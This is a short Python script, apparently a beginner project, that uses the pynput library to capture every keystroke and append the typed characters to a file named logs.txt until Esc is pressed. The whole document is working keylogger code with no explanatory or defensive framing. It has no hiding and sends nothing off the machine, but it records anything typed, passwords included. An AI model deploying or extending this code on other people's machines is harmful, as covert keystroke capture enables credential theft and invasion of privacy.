from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
    print(f'{key} pressed')

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("logs.txt", "a") as log_file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                log_file.write('\n')
            elif k.find("Key") == -1:
                log_file.write(k)

def on_release(key):
    if key == Key.esc:
        return False    



with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()
    
